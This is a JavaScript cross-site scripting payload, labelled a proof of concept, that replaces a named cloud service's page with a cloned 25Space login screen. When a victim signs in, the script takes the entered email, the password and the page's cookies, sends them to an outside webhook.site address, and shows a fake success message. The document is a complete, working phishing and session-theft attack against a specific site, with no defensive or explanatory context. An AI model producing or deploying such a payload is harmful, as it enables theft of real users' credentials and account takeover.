// Final Perfect Clone PoC - Uses ONLY same-origin relative paths for assets
// Since XSS runs on cloud.25space.com domain, relative paths (no host) will load REAL logo, background, QR from their server
// No external APIs needed - QR will load if it's a static <img src="/path/to/qr.png">
// Background via body or container background-image
// This guarantees images load exactly like the real page!

(function() {
  const webhookUrl = 'https://webhook.site/acaf7007-fbc2-462c-b96d-28b307aefb8b'; // Replace!

  // Clone the structure as close as possible
  const fullPageHTML = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Cloud Management Suite - Login</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    html, body {
      height: 100%;
      font-family: 'Segoe UI', Arial, sans-serif;
      color: white;
    }
    body {
      background-image: url('/assets/images/login-bg.jpg'); /* Common path - change if different */
      background-size: cover;
      background-position: center;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .container {
      display: flex;
      width: 95%;
      max-width: 1300px;
      height: 85vh;
      overflow: hidden;
      border-radius: 10px;
      box-shadow: 0 0 30px rgba(0,0,0,0.6);
    }
    .left {
      flex: 1;
      padding: 60px;
      display: flex;
      flex-direction: column;
      justify-content: center;
    }
    .left h1 {
      font-size: 4.5rem;
      font-weight: 300;
      margin-bottom: 30px;
    }
    .left p {
      font-size: 1.3rem;
      margin-bottom: 50px;
      max-width: 80%;
    }
    .qr-code {
      width: 240px;
      height: 240px;
      border: 10px solid white;
      border-radius: 12px;
      box-shadow: 0 10px 20px rgba(0,0,0,0.5);
    }
    .right {
      flex: 1;
      background: rgba(0,0,0,0.85);
      padding: 60px;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
    }
    .logo {
      width: 90px;
      margin-bottom: 30px;
    }
    .right h2 {
      font-size: 2rem;
      font-weight: 400;
      margin-bottom: 40px;
      text-align: center;
    }
    form {
      width: 100%;
      max-width: 420px;
    }
    input[type="email"], input[type="password"] {
      width: 100%;
      padding: 18px;
      margin-bottom: 20px;
      background: #555;
      border: none;
      border-radius: 8px;
      color: white;
      font-size: 1.1rem;
    }
    input::placeholder {
      color: #bbb;
    }
    .remember {
      display: flex;
      justify-content: space-between;
      margin-bottom: 30px;
      font-size: 1rem;
    }
    .problems-link {
      color: #ffb000;
      text-decoration: none;
    }
    button {
      width: 100%;
      padding: 18px;
      background: #ffb000;
      color: black;
      border: none;
      border-radius: 30px;
      font-size: 1.3rem;
      font-weight: bold;
      cursor: pointer;
    }
    .create-account {
      text-align: center;
      margin-top: 30px;
      font-size: 1rem;
    }
    .create-link {
      color: #ffb000;
      text-decoration: none;
    }
    footer {
      position: fixed;
      bottom: 20px;
      width: 100%;
      text-align: center;
      font-size: 0.9rem;
      color: #aaa;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="left">
      <h1>Good morning!</h1>
      <p>Use 25Space across any device on the go. Scan the QR code to continue on other devices.</p>
      <img src="/assets/images/qr-code.png" alt="QR Code" class="qr-code" onerror="this.src='https://api.qrserver.com/v1/create-qr-code/?size=240x240&data=' + location.origin">
    </div>
    <div class="right">
      <img src="/assets/images/logo.png" alt="25Space Logo" class="logo" onerror="this.style.display='none'">
      <h2>Cloud Management Suite.</h2>
      <form id="loginForm">
        <input type="email" placeholder="Email" required>
        <input type="password" placeholder="Password" required>
        <div class="remember">
          <label><input type="checkbox"> Remember me</label>
          <a href="#" class="problems-link">Problems with login?</a>
        </div>
        <button type="submit">Sign in</button>
        <div class="create-account">
          Don't have an account? <a href="#" class="create-link">Create an account</a>
        </div>
      </form>
    </div>
  </div>
  <footer>© 2015-2025 25space.com - Legal - Privacy - About - Health</footer>

  <script>
    document.getElementById('loginForm').addEventListener('submit', function(e) {
      e.preventDefault();
      const data = {
        email: this.querySelector('input[type="email"]').value,
        password: this.querySelector('input[type="password"]').value,
        cookies: document.cookie,
        url: location.href
      };
      fetch('${webhookUrl}', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify(data)
      }).then(() => {
        alert('Login successful!');
      });
    });
  </script>
</body>
</html>`;

  document.open();
  document.write(fullPageHTML);
  document.close();
})();
